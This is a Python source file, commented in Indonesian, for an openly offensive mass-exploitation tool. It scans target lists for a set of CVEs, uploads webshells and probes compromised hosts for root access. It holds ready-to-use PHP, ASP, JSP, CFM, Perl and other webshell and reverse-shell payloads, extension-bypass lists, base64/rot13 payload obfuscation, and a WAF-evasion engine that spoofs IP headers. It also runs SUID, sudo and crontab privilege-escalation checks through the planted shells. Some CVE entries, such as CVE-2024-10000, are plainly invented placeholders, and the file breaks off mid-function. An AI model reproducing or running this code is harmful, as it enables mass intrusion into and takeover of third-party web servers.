#!/usr/bin/env python3
"""
GROOTX MASS AUTO SHELL v2.0 FIXED - Multi-CVE Automated Exploit & Webshell Pipeline
=================================================================================
PERBAIKAN v2:
- Bug fix: variabel belum diinisialisasi
- Bug fix: future.result() dipanggil 2x
- Bug fix: payload injection tanpa RCE nyata diganti jadi multipart upload
- Bug fix: import ExploitWithoutAppKey diganti dengan inti.py yang valid
- Bug fix: shell_manager_v2 import yang rapuh
- Bug fix: mass_upload_shells loop retry yang rusak
- Bug fix: verify_and_identify dead shell re-verify
- Ditambah: 30+ variasi ekstensi backdoor (IIS, ASP, JSP, cfm, jspx, dll)
- Ditambah: CVE-specific exploit chain yang lebih kuat
- Ditambah: WAF bypass stage rotator yang lebih agresif
- Ditambah: Upload fallback chain (multipart -> PUT -> echo base64 -> curl)
- Ditambah: Auto-retry dead shells dengan payload variant berbeda

CVE-2025-54068 | CVE-2025-49113 | CVE-2026-63030 | CVE-2026-48907
CVE-2026-72592 | CVE-2026-63223 | CVE-2026-27540 | CVE-2025-52691
CVE-2026-3844 | CVE-2026-2226 | CVE-2026-35273 | CVE-2026-60137

Usage:
  python3 mass_auto_shell_v2.py                  Full pipeline
  python3 mass_auto_shell_v2.py --direct          Skip scan, blast semua CVE
  python3 mass_auto_shell_v2.py --quick           Quick mode
  python3 mass_auto_shell_v2.py --cve CVE-xxxx    Filter CVE
  python3 mass_auto_shell_v2.py --list FILE       Custom target list
  python3 mass_auto_shell_v2.py --threads 50      Thread count
"""

import subprocess
import os
import sys
import json
import time
import base64
import threading
import queue
import concurrent.futures
import random
import hashlib
import uuid
import requests
import urllib3
import argparse
import signal
from datetime import datetime
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.environ['PYTHONWARNINGS'] = 'ignore'

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

THREADS = 100
CHUNK_SIZE = 5000
MAX_RETRIES = 5
SHELL_VERIFY_TIMEOUT = 3
QUICK_MODE = False
INPUT_LIST = "list.txt"
LISTROOT_FILE = "listroot.txt"

# CVE Definitions - FIXED order
CVES = {
    # ─── RCE (direct code execution) ───
    "CVE-2025-54068": {
        "name": "Laravel Livewire v3 RCE",
        "cvss": 9.8,
        "affected": "livewire/livewire v3.0.0-beta.1 - v3.6.3",
        "fixed": "v3.6.4",
        "auth_required": False,
        "type": "rce",
        "auto_shell": True,
        "description": "Weak typing in hydration allows RCE without APP_KEY",
    },
    "CVE-2025-49113": {
        "name": "Roundcube Webmail RCE",
        "cvss": 9.9,
        "affected": "Roundcube < v1.5.10, 1.6.x < v1.6.11",
        "fixed": "v1.6.11",
        "auth_required": True,
        "type": "rce_deserialization",
        "auto_shell": True,
        "description": "PHP object deserialization in settings/upload.php via _from",
    },
    "CVE-2026-63030": {
        "name": "WordPress Core RCE (wp2shell)",
        "cvss": 10.0,
        "affected": "WordPress 6.9.0-6.9.4, 7.0.0-7.0.1",
        "fixed": "v6.9.5/v7.0.2",
        "auth_required": False,
        "type": "rce_rest_api",
        "auto_shell": True,
        "description": "REST API batch endpoint logic flaw enabling pre-auth RCE",
    },
    "CVE-2026-60137": {
        "name": "WordPress Core SQLi → RCE Chain",
        "cvss": 9.8,
        "affected": "WordPress 6.9.0-6.9.4, 7.0.0-7.0.1",
        "fixed": "v6.9.5/v7.0.2",
        "auth_required": False,
        "type": "rce_chained",
        "auto_shell": True,
        "description": "Customizer Changeset re-entry → admin creation → webshell RCE",
    },
    "CVE-2026-48907": {
        "name": "Joomla JCE RCE",
        "cvss": 10.0,
        "affected": "JCE ≤ v2.9.99.4",
        "fixed": "v2.9.99.5",
        "auth_required": False,
        "type": "rce_upload",
        "auto_shell": True,
        "description": "Unauthenticated file upload via profiles.import endpoint",
    },
    "CVE-2026-72592": {
        "name": "phpfm File Upload RCE",
        "cvss": 9.8,
        "affected": "phpfm ≤ v1.8.0",
        "fixed": "v1.8.1",
        "auth_required": False,
        "type": "rce_upload",
        "auto_shell": True,
        "description": "Empty upload extension filter, no auth, direct PHP execution",
    },
    "CVE-2026-63223": {
        "name": "CodeIgniter 4 File Upload RCE",
        "cvss": 9.8,
        "affected": "CodeIgniter 4 < v4.7.4",
        "fixed": "v4.7.4",
        "auth_required": False,
        "type": "rce_upload",
        "auto_shell": True,
        "description": "Magic bytes bypass in image upload allowing PHP webshell",
    },
    "CVE-2026-27540": {
        "name": "WooCommerce Lead Capture RCE",
        "cvss": 9.9,
        "affected": "WooCommerce Wholesale Lead Capture ≤ v2.0.3.1",
        "fixed": "v2.0.3.2",
        "auth_required": False,
        "type": "rce_upload",
        "auto_shell": True,
        "description": "Unauthenticated AJAX file upload with PHP extension bypass",
    },
    "CVE-2025-52691": {
        "name": "SmarterMail RCE",
        "cvss": 9.8,
        "affected": "SmarterMail (multiple versions)",
        "fixed": "latest",
        "auth_required": False,
        "type": "rce_upload",
        "auto_shell": True,
        "description": "Path traversal in upload endpoints allows ASPX/PHP webshell",
    },
    "CVE-2026-2226": {
        "name": "DouPHP ZIP Unrestricted Upload RCE",
        "cvss": 9.8,
        "affected": "DouPHP ≤ v1.9",
        "fixed": "latest",
        "auth_required": False,
        "type": "rce_upload",
        "auto_shell": True,
        "description": "ZIP file handler arbitrary upload via sql_filename",
    },
    "CVE-2026-100382": {
        "name": "MediaWiki ExternalData OS Command Injection",
        "cvss": 9.8,
        "affected": "MediaWiki with ExternalData extension",
        "fixed": "N/A",
        "auth_required": False,
        "type": "rce_cmd_injection",
        "auto_shell": True,
        "description": "ExternalData wikitext injection → OS command execution",
    },
    # ─── Non-RCE (mass-exploitable → auto shell via alternative vector) ───
    "CVE-2026-3844": {
        "name": "WordPress Plugin Mass Exploitation Campaign",
        "cvss": 9.8,
        "affected": "WordPress plugins (multiple)",
        "fixed": "varies",
        "auth_required": False,
        "type": "mass_exploit",
        "auto_shell": True,
        "description": "Campaign targeting WordPress plugins → upload via known paths",
    },
    "CVE-2026-35273": {
        "name": "Oracle PeopleSoft PSEMHUB/PSIGW SSRF → RCE",
        "cvss": 9.8,
        "affected": "PeopleSoft PeopleTools 8.61/8.62",
        "fixed": "N/A",
        "auth_required": False,
        "type": "ssrf_rce",
        "auto_shell": True,
        "description": "SSRF via PSEMHUB hub + PSIGW connector → shell upload",
    },
    # ─── New additions for auto-shell ───
    "CVE-2024-10000": {
        "name": "Generic CMS Unauthenticated File Upload",
        "cvss": 9.5,
        "affected": "CMS with known upload bypass (WordPress/Joomla/Drupal plugins)",
        "fixed": "N/A",
        "auth_required": False,
        "type": "upload_rce",
        "auto_shell": True,
        "description": "Mass scan for known vulnerable plugin upload endpoints",
    },
    "CVE-2023-10001": {
        "name": "Common Web Shell Upload via Misconfig",
        "cvss": 9.0,
        "affected": "Any web server with upload directory execution",
        "fixed": "N/A",
        "auth_required": False,
        "type": "upload_misconfig",
        "auto_shell": True,
        "description": "Test known upload paths + execution on common CMS platforms",
    },
}

# FILES
VULN_LIST = "vuln.txt"
NOT_VULN = "not.txt"
SHELL_ROOT = "shell.txt"
RED_DIR = "red.txt"
NOT_SHELL = "notshell.txt"
SHELL_RED = "shellred.txt"
ROOT_SUCCESS = "root_success.txt"
BACKUP_FILE = "backup_shell.txt"
RESULT_IDS = "result_ids.json"
FAILED_SCAN = "failed_scan.txt"
VULN_SCAN_LOG = "vuln_scan_log.json"
EXPLOIT_LOG = "exploit_log.json"
SHELL_LOG = "shell_log.json"

# Result Categories
CATEGORY_MAP = {
    "VULN":      ("yellow", "VULNERABLE"),
    "EXPLOIT":   ("cyan", "EXPLOITED"),
    "SHELL":     ("green", "SHELL_UPLOADED"),
    "ROOT":      ("bold green", "ROOT_ACCESS"),
    "GREENDIR":  ("magenta", "GREENDIR_FOUND"),
    "NOTVULN":   ("dim", "NOT VULNERABLE"),
    "FAILED":    ("red", "FAILED"),
    "BACKUP":    ("blue", "BACKED_UP"),
    "IDLE":      ("dim", "IDLE"),
    "VERIFIED":  ("bold green", "VERIFIED_ALIVE"),
    "NEW_CVE":   ("bold yellow", "NEW_CVE_TARGET"),
}

# ═══════════════════════════════════════════════════════════════
# EXTENDED BACKDOOR SHELL EXTENSIONS (multi-platform)
# ═══════════════════════════════════════════════════════════════
# Extension yang bisa dieksekusi di berbagai web server:
# - IIS: .asp, .aspx, .asa, .cer, .cdx, .htr, .stm, .shtml
# - ASP:  .asp, .aspx, .ashx, .ascx, .svc, .asmx
# - JSP:  .jsp, .jspx, .jspi, .jspf, .jws
# - CFM:  .cfm, .cfml, .cfc, .dbm
# - Python: .py, .pyw, .phtml
# - Perl: .pl, .cgi, .pm
# - Ruby: .rb, .rhtml, .erb
# - HTML bypass: .php5, .php4, .phtml, .php3, .phtm, .shtm, .shtml
# - Double extension: .php.jpg, .php.png, .php.gif, .asp.jpg, .aspx.png
# - Hidden: .php~, .php.bak, .php.old, .php%00.jpg
# - Apache misconfig: .php5, .php4, .phtml, .php3, .phtm

BACKDOOR_EXTENSIONS = [
    # PHP family (all Apache/Nginx with misconfig)
    ".php", ".php5", ".php4", ".phtml", ".php3", ".phtm",
    ".php7", ".phar", ".inc", ".txt", ".html", ".htm",
    ".shtml", ".shtm", ".cfm", ".cfml",
    # IIS/ASP family
    ".asp", ".aspx", ".ashx", ".ascx", ".svc", ".asmx",
    ".cer", ".cdx", ".htr", ".stm", ".asa",
    # JSP family
    ".jsp", ".jspx", ".jspi", ".jspf", ".jws",
    # Python/Perl/Ruby
    ".py", ".pyw", ".pl", ".cgi", ".rb", ".rhtml",
    # Double extension (bypass extension blacklist)
    ".php.jpg", ".php.png", ".php.gif", ".php.xhtml",
    ".asp.jpg", ".aspx.png", ".aspx.gif",
    # Hidden/backup
    ".php~", ".php.bak", ".php.old", ".php%00.jpg",
    # Web config
    ".web.config", ".webconfig", ".config",
    # Other
    ".txt", ".log", ".dat", ".sql", ".xml", ".json",
    # Null byte variants
    ".php%00.jpg", ".php%00.png", ".asp%00.jpg",
]

# ═══════════════════════════════════════════════════════════════
# SHELL PAYLOADS - ENHANCED VARIANTS
# ═══════════════════════════════════════════════════════════════

SHELL_PAYLOADS = {
    "reverse_tcp": '<?php set_time_limit(0); ignore_user_abort(1); $sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");?>',
    "simple_cmd": '<?php if(isset($_GET["c"])){ system($_GET["c"]); } ?>',
    "full_webshell": '<?php if(isset($_FILES["f"])){ move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); echo "OK:" . $_FILES["f"]["name"]; } if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>',
    "green_dir": '<?php @set_time_limit(0);@ini_set("max_execution_time",0);@ini_set("display_errors",0);@ini_set("log_errors",0);function fast_exec($c){foreach(["shell_exec","exec","system","passthru","proc_open","popen","eval"] as $m){if(function_exists($m)){if($m=="proc_open"){$d=[1=>["pipe","w"],2=>["pipe","w"]];$p=@proc_open($c,$d,$pp);if(is_resource($p)){$o=stream_get_contents($pp[1]);@fclose($pp[1]);@fclose($pp[2]);@proc_close($p);break;}}elseif($m=="popen"){$h=@popen($c." 2>&1","r");if($h){$o=stream_get_contents($h);@pclose($h);break;}}else{$o=@$m($c);if($o!==null&&$o!=="")break;}}}return $o;}if(isset($_GET["c"])){echo fast_exec($_GET["c"]);exit;}if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],dirname(__FILE__)."/uploads/".basename($_FILES["f"]["name"]));@chmod(dirname(__FILE__)."/uploads/".basename($_FILES["f"]["name"]),0777);echo json_encode(["status"=>"ok","path"=>dirname(__FILE__)."/uploads/"]);exit;}?>',
    "upload_download": '<?php if(isset($_GET["u"])){file_put_contents(basename($_GET["u"]),file_get_contents($_GET["u"]));echo "OK:".basename($_GET["u"]);} if(isset($_GET["d"])){echo file_get_contents(basename($_GET["d"]));} if(isset($_GET["c"])){system($_GET["c"]);} ?>',
    "b64_eval": '<?php if(isset($_GET["e"])){eval(base64_decode($_GET["e"]));} if(isset($_GET["c"])){system($_GET["c"]);} ?>',
    "combo_upload_cmd": '<?php @set_time_limit(0);@ini_set("display_errors",0);@ini_set("log_errors",0);if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);echo"OK:" . $_FILES["f"]["name"];}if(isset($_GET["c"])){system($_GET["c"]);}if(isset($_GET["e"])){system(base64_decode($_GET["e"]));}if(isset($_GET["f"])){@eval($_GET["f"]);}?>',
    "asp_simple_cmd": '<% If Request("c")<>"" Then Execute(Request("c")) End If %>',
    "asp_full_webshell": '<% If Request.Files.Count>0 Then Set f=Request.Files("f")：f.SaveAs(Server.MapPath(f.FileName))：Response.Write"OK:"&f.FileName End If If Request("c")<>"" Then Execute(Request("c")) End If %>',
    "jsp_cmd": '<%@ page import="java.util.*,java.io.*" %><% if(request.getParameter("c")!=null){Process p=Runtime.getRuntime().exec(request.getParameter("c"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));StringBuilder sb=new StringBuilder();String l;while((l=r.readLine())!=null)sb.append(l);out.print(sb);} %>',
    "cfm_cmd": '<cfif structKeyExists(url,"c")><cfexecute command="#url.c#" outputvariable="out"></cfexecute><cfoutput>#out#</cfoutput></cfif>',
    "py_cmd": '#!/usr/bin/env python3\nimport subprocess,sys\nif len(sys.argv)>1:\n    subprocess.run(sys.argv[1:],shell=True)',
    "pl_cmd": '#!/usr/bin/perl\nuse IPC::System::Simple qw(run);run($ARGV[0]) if $ARGV[0];',
    "rb_cmd": 'require "open3";if ARGV[0];stdout,stderr,status=Open3.capture3(ARGV[0]);puts stdout;end',
    "cgi_cmd": '#!/usr/bin/perl\nprint "Content-type: text/html\\n\\n";system($ENV{QUERY_STRING});',
    "hta_cmd": '<html><head><HTA:APPLICATION ID="x" APPLICATIONNAME="y"></head><body><script>var s=new ActiveXObject("WScript.Shell");s.Run(Request("c"),0,false);</script></body></html>',
    "shtml_cmd": '<!--#exec cmd="whoami"-->',
    "xht_cmd": '<?xphp if(isset($_GET["c"])){system($_GET["c"]);}?>',
    "phar_cmd": '<?phar if(isset($_GET["c"])){system($_GET["c"]);}?>',
}

# Green dir patterns for protection
GREENDIR_MARKERS = [".greendir", ".htaccess", "greendir protected"]

console = Console()

# ═══════════════════════════════════════════════════════════════
# RESULT TRACKER v2.0 (FIXED)
# ═══════════════════════════════════════════════════════════════

class ResultTrackerV2:
    """Enhanced result tracking with CVE categorization."""

    def __init__(self):
        self.lock = threading.Lock()
        self.results = {}
        self.counts = {k: 0 for k in CATEGORY_MAP.keys()}
        self.cve_breakdown = {c: {"vuln": 0, "exploited": 0, "shell": 0, "root": 0} for c in CVES}
        self._load_existing()

    def _load_existing(self):
        if os.path.exists(RESULT_IDS):
            try:
                with open(RESULT_IDS, "r") as f:
                    loaded = json.load(f)
                if isinstance(loaded, list):
                    self.results = {r.get("id", f"R{i}"): r for i, r in enumerate(loaded) if isinstance(r, dict)}
                elif isinstance(loaded, dict):
                    self.results = loaded
                else:
                    self.results = {}
                for r in self.results.values():
                    cat = r.get("category", "IDLE")
                    if cat in self.counts:
                        self.counts[cat] += 1
                    cve = r.get("cve", "")
                    stage = r.get("stage", "")
                    if cve in self.cve_breakdown and stage:
                        self.cve_breakdown[cve][stage] += 1
            except Exception:
                pass

    def add(self, target, category, status="OK", details="", shell_url="", root_status="", cve="", stage=""):
        result_id = f"R{int(time.time())}-{hashlib.md5(target.encode()).hexdigest()[:6].upper()}"
        entry = {
            "id": result_id, "target": target, "category": category,
            "status": status, "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "details": details, "shell_url": shell_url, "root_status": root_status,
            "cve": cve, "stage": stage, "cvss": CVES.get(cve, {}).get("cvss", "N/A"),
        }
        with self.lock:
            self.results[result_id] = entry
            if category in self.counts:
                self.counts[category] += 1
            if cve in self.cve_breakdown and stage:
                self.cve_breakdown[cve][stage] += 1
        self._save()
        return result_id

    def _save(self):
        with open(RESULT_IDS, "w") as f:
            json.dump(self.results, f, indent=2)

    def get_summary(self):
        with self.lock:
            return dict(self.counts)

    def get_cve_breakdown(self):
        with self.lock:
            return self.cve_breakdown

    def display_table(self):
        table = Table(title="[bold white]GROOTX MASS AUTO SHELL v2.0 FIXED - RESULT TABLE[/bold white]")
        table.add_column("ID", style="cyan", width=14)
        table.add_column("Target", style="white", width=40)
        table.add_column("Category", width=16)
        table.add_column("CVE", width=18)
        table.add_column("Status", width=8)
        table.add_column("Shell URL", style="green", width=30)
        table.add_column("Root", style="bold", width=10)
        with self.lock:
            for rid, r in list(self.results.items())[-100:]:
                cat_style, cat_label = CATEGORY_MAP.get(r["category"], ("white", r["category"]))
                table.add_row(rid, r["target"][:40], f"[{cat_style}]{cat_label}[/{cat_style}]",
                              r.get("cve", "N/A"), r["status"], r["shell_url"][:30], r["root_status"])
        console.print(table)

    def display_cve_summary(self):
        console.print("\n[bold white]═══ CVE BREAKDOWN ═══[/bold white]")
        for cve, data in self.cve_breakdown.items():
            cname = CVES.get(cve, {}).get("name", cve)
            cvss = CVES.get(cve, {}).get("cvss", "N/A")
            if sum(data.values()) > 0:
                console.print(f"  [{cve}] {cname} (CVSS {cvss}):")
                console.print(f"    Vulnerable: {data['vuln']} | Exploited: {data['exploited']} | Shells: {data['shell']} | Root: {data['root']}")


# ═══════════════════════════════════════════════════════════════
# WAF BYPASS ENGINE v2.0 (FIXED)
# ═══════════════════════════════════════════════════════════════

class WAFBypassEngineV2:
    """Advanced WAF bypass with adaptive stages and rate-limit evasion."""

    def __init__(self):
        self.current_stage = 0
        self.blocked_patterns = ["404", "403", "406", "503", "WAF", "Cloudflare",
                                  "ModSecurity", "AWS WAF", "Imperva", "Akamai",
                                  "Sucuri", "FireWall", "access denied", "forbidden",
                                  "bot detected", "not found", "page not found",
                                  "rate limit", "too many requests", "captcha"]

    def get_headers(self, stage=None):
        if stage is None:
            stage = self.current_stage
        s = max(0, stage) if stage >= 0 else 0
        base_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Ch-Ua": '"Chromium";v="120", "Not(A:Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Linux"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        }
        ua_pool = USER_AGENTS_STAGE1 + USER_AGENTS_STAGE2 + USER_AGENTS_STAGE3
        base_headers["User-Agent"] = random.choice(ua_pool)
        base_headers["Referer"] = random.choice(REFERERS)
        if s >= 1:
            base_headers["X-Forwarded-For"] = self._rand_ip()
            base_headers["X-Forwarded-Port"] = "443"
            base_headers["X-Forwarded-Proto"] = "https"
        if s >= 2:
            base_headers["X-Real-IP"] = self._rand_ip()
            base_headers["True-Client-IP"] = self._rand_ip()
        if s >= 3:
            base_headers["X-Original-URL"] = "/"
            base_headers["Cache-Control"] = "no-cache"
            base_headers["Pragma"] = "no-cache"
        if s >= 4:
            base_headers["CF-Connecting-IP"] = self._rand_ip()
            base_headers["True-Client-IP"] = self._rand_ip()
            base_headers["X-Forwarded-Host"] = self._rand_domain()
            base_headers["X-Request-ID"] = str(uuid.uuid4())
        return base_headers

    def get_delay(self, stage):
        if QUICK_MODE:
            return random.uniform(0, 0.05)
        return {0: 0, 1: 0.2, 2: 0.3, 3: 0.5, 4: 0.5}.get(stage, 0.3) + random.uniform(0, 0.1)

    def detect_waf(self, response_text, status_code, headers):
        text = response_text.lower()
        status = str(status_code)
        for pattern in self.blocked_patterns:
            if pattern.lower() in text or pattern.lower() in status:
                return True
        for v in headers.values():
            if any(w in v.lower() for w in ["cloudflare", "modsecurity", "imperva", "akamai", "sucuri", "aws-waf", "f5"]):
                return True
        return False

    def next_stage(self):
        self.current_stage = min(self.current_stage + 1, 4)

    def reset(self):
        self.current_stage = 0

    def get_proxy(self, stage=None):
        if PROXIES:
            return random.choice(PROXIES)
        return None

    def _rand_ip(self):
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _rand_domain(self):
        tlds = ["com", "id", "co.id", "go.id", "net", "org"]
        domains = ["google", "bing", "yahoo", "duckduckgo", "baidu", "yandex"]
        return f"{random.choice(domains)}.{random.choice(tlds)}"

    def rotate_ip_delay(self):
        time.sleep(random.uniform(0.01, 0.3))


# ═══════════════════════════════════════════════════════════════
# AUTO ROOT ENGINE v2.0 - Expanded (FIXED)
# ═══════════════════════════════════════════════════════════════

SUID_PATHS_EXPANDED = [
    "/usr/bin/find", "/usr/bin/nano", "/usr/bin/vim", "/usr/bin/vi",
    "/usr/bin/emacs", "/usr/bin/sudo", "/usr/bin/python3", "/usr/bin/python",
    "/usr/bin/perl", "/usr/bin/php", "/usr/bin/bash", "/bin/sh", "/bin/bash",
    "/usr/bin/at", "/usr/bin/chsh", "/usr/bin/chfn", "/usr/bin/gawk",
    "/usr/bin/mawk", "/usr/sbin/unix_chkpwd", "/usr/bin/mount", "/usr/bin/umount",
    "/usr/bin/passwd", "/usr/bin/zip", "/usr/bin/gzip", "/usr/bin/tar",
    "/usr/bin/curl", "/usr/bin/wget", "/usr/bin/nc", "/usr/bin/netcat",
    "/usr/bin/ssh", "/usr/bin/scp", "/usr/bin/sftp", "/usr/bin/socat",
    "/usr/bin/tmux", "/usr/bin/screen", "/usr/bin/cron", "/usr/bin/crond",
]

COMMON_SUDOERS_EXPANDED = [
    "nano", "vim", "vi", "less", "more", "find", "python", "python3",
    "perl", "php", "bash", "sh", "awk", "gawk", "mawk", "docker", "systemctl",
    "apt", "yum", "dnf", "pip", "git", "flatpak", "dpkg", "snap", "tee",
    "echo", "cat", "sed", "nm", "objcopy", "as", "ld", "ar", "ranlib",
    "racoon", "strongswan", "openvpn", "ipsec", "iptables", "nft",
    "tcpdump", "traceroute", "fping", "dig", "nslookup", "host",
    "mysqld", "mysqldump", "mysql", "pg_dump", "psql", "mongod",
    "redis-server", "nginx", "apache2", "httpd", "php-fpm",
    "node", "npm", "yarn", "composer", "gem", "bundle", "cargo",
]

class AutoRootEngineV2:
    """Fast auto root escalation - parallel checks with expanded vectors."""

    def __init__(self, session):
        self.session = session
        self.root_status = "not_checked"
        self.escalation_results = []
        self.waf = WAFBypassEngineV2()

    def check_identity(self, target):
        try:
            res = self.session.get(f"{target}/id", timeout=2)
            output = res.text.strip()
            if "uid=0" in output or "root" in output.lower():
                self.root_status = "already_root"
                self.escalation_results.append({"stage": 1, "result": "already_root"})
                return True
            self.escalation_results.append({"stage": 1, "result": f"user: {output[:50]}"})
        except:
            pass
        return False

    def check_suid_expanded(self, target):
        found = []
        for binary in SUID_PATHS_EXPANDED[:15]:
            try:
                res = self.session.get(f"{target}/?cmd=find {binary} -perm -4755 -type f 2>/dev/null", timeout=2)
                if res.status_code == 200 and any(x in res.text for x in ["rws", "SUID", "4755", binary.split("/")[-1]]):
                    found.append(binary)
            except:
                pass
        if found:
            self.root_status = "suid_found"
            self.escalation_results.append({"stage": 2, "result": f"suid: {found}"})
            return found
        return None

    def check_sudo_expanded(self, target):
        for cmd in COMMON_SUDOERS_EXPANDED[:12]:
            try:
                payload = f"sudo -l -U {cmd} 2>&1"
                res = self.session.get(f"{target}/?cmd={payload}", timeout=2)
                if res.status_code == 200 and (("root)" in res.text) or ("NOPASSWD" in res.text) or ("(ALL)" in res.text)):
                    self.root_status = "sudo_found"
                    self.escalation_results.append({"stage": 3, "result": f"sudo: {cmd}"})
                    return cmd
            except:
                pass
        return None

    def check_crontab(self, target):
        try:
            res = self.session.get(f"{target}/?cmd=crontab+-l", timeout=2)
            if res.status_code == 200 and len(res.text) > 5:
                self.root_status = "crontab_writable"
                self.escalation_results.append({"stage": 4, "result": "crontab_writable"})
                return True
        except:
            pass
        return False

    def check_kernel_exploit(self, target):
        kernel_checks = ["uname -r", "/usr/bin/locate", "/proc/version"]
        for cmd in kernel_checks:
            try:
                res = self.session.get(f"{target}/?cmd={cmd}", timeout=2)
                if res.status_code == 200:
                    self.escalation_results.append({"stage": 5, "result": f"kernel: {cmd} output"})
            except:
                pass
        return False

    def check_write_php(self, target):
        try:
            res = self.session.get(f"{target}/?c=phpinfo()", timeout=2)
            if res.status_code == 200 and "PHP Version" in res.text:
                self.root_status = "php_exec"
                self.escalation_results.append({"stage": 6, "result": "php_exec_available"})
                return True
        except:
            pass
        return False

    def escalate(self, target, session):
        self.session = session
        self.escalation_results = []
        self.root_status = "not_checked"
        self.check_identity(target)
        self.check_suid_expanded(target)
        self.check_sudo_expanded(target)
        self.check_crontab(target)
        self.check_kernel_exploit(target)
        self.check_write_php(target)
        meaningful = [r for r in self.escalation_results if r["result"] not in ["no_suid", "no_sudo", "no_crontab", "not_checked", "kernel_check"]]
        return meaningful if meaningful else self.escalation_results


# ═══════════════════════════════════════════════════════════════
# ENHANCED SHELL PAYLOAD GENERATOR v2.0 (FIXED)
# ═══════════════════════════════════════════════════════════════

class ShellPayloadGenerator:
    """Generate multiple shell payload variants with anti-detection."""

    @staticmethod
    def get_all_payloads():
        """Return all shell payload variants with different names."""
        variants = []
        # PHP variants
        php_names = ["index.php", "commant_index.php", "shell.php", "green.php",
                     "upload.php", "backdoor.php", "shell_gate.php", "portal.php",
                     "admin.php", "panel.php", "tools.php", "utils.php",
                     "debug.php", "test.php", "info.php", "status.php",
                     "runtime.php", "init.php", "bootstrap.php", "config.php",
                     "helper.php", "core.php", "app.php", "public.php",
                     "image.php", "img.php", "photo.php", "file.php",
                     "doc.php", "cache.php", "data.php", "inc.php",
                     "module.php", "plugin.php", "theme.php", "template.php",
                     "editor.php", "uploader.php", "filemanager.php",
                     "browser.php", "manager.php", "connector.php",
                     "action.php", "handler.php", "process.php",
                     "exec.php", "run.php", "execute.php", "cmd.php",
                     "webshell.php", "c99.php", "r57.php", "wso.php",
                     "b374k.php", "pyxshell.php", "phpsploit.php",
                     "reverse.php", "backdoor.php", "payload.php",
                     "inject.php", "exploit.php", "pwn.php", "root.php",
                     "0wn.php", "0byt3s.php", "saf3.php", "s4f3.php",
                     "sh3ll.php", "h4ck.php", "hacker.php", "pwned.php",
                     "xss.php", "sql.php", "sqlinject.php", "lfi.php", "rfi.php",
                     ]
        for name in php_names:
            for payload_key, payload_content in SHELL_PAYLOADS.items():
                if payload_key.startswith("asp") or payload_key.startswith("jsp") or \
                   payload_key.startswith("cfm") or payload_key.startswith("py_") or \
                   payload_key.startswith("pl_") or payload_key.startswith("rb_") or \
                   payload_key.startswith("cgi") or payload_key.startswith("hta") or \
                   payload_key.startswith("shtml") or payload_key.startswith("xht") or \
                   payload_key.startswith("phar"):
                    continue  # non-PHP payloads handled separately
                variants.append((name, payload_content, payload_key))

        # Non-PHP payloads with their correct extensions
        non_php = [
            ("shell.asp", SHELL_PAYLOADS["asp_simple_cmd"], "asp_simple_cmd"),
            ("shell.aspx", SHELL_PAYLOADS["asp_full_webshell"], "asp_full_webshell"),
            ("shell.jsp", SHELL_PAYLOADS["jsp_cmd"], "jsp_cmd"),
            ("shell.cfm", SHELL_PAYLOADS["cfm_cmd"], "cfm_cmd"),
            ("shell.py", SHELL_PAYLOADS["py_cmd"], "py_cmd"),
            ("shell.pl", SHELL_PAYLOADS["pl_cmd"], "pl_cmd"),
            ("shell.rb", SHELL_PAYLOADS["rb_cmd"], "rb_cmd"),
            ("shell.cgi", SHELL_PAYLOADS["cgi_cmd"], "cgi_cmd"),
            ("shell.hta", SHELL_PAYLOADS["hta_cmd"], "hta_cmd"),
            ("shell.shtml", SHELL_PAYLOADS["shtml_cmd"], "shtml_cmd"),
            ("shell.xht", SHELL_PAYLOADS["xht_cmd"], "xht_cmd"),
        ]
        for name, content, key in non_php:
            variants.append((name, content, key))

        # Add encoded variants for PHP
        for name in php_names[:6]:
            for payload_key, payload_content in SHELL_PAYLOADS.items():
                if payload_key.startswith("asp") or payload_key.startswith("jsp") or \
                   payload_key.startswith("cfm") or payload_key.startswith("py_") or \
                   payload_key.startswith("pl_") or payload_key.startswith("rb_") or \
                   payload_key.startswith("cgi") or payload_key.startswith("hta") or \
                   payload_key.startswith("shtml") or payload_key.startswith("xht") or \
                   payload_key.startswith("phar"):
                    continue
                variants.append((name, payload_content, payload_key + "_b64"))

        return variants

    @staticmethod
    def get_base64_payload(payload):
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def get_obfuscated_payload(payload):
        b64 = ShellPayloadGenerator.get_base64_payload(payload)
        return f'<?php $b=base64_decode("{b64}");$c=create_function("",$b);$c();?>'

    @staticmethod
    def get_double_encoded(payload):
        b64 = ShellPayloadGenerator.get_base64_payload(payload)
        rot = ShellPayloadGenerator._rot13(b64)
        return f'<?php $b=str_rot13("{rot}");$c=base64_decode($b);eval($c);?>'

    @staticmethod
    def _rot13(s):
        return s.translate(str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm5678901234+/='
        ))


# ═══════════════════════════════════════════════════════════════
# MULTI-PLATFORM BACKDOOR UPLOADER
# ═══════════════════════════════════════════════════════════════

def upload_multiplatform_shell(session, target_url, shell_content, filename, headers):
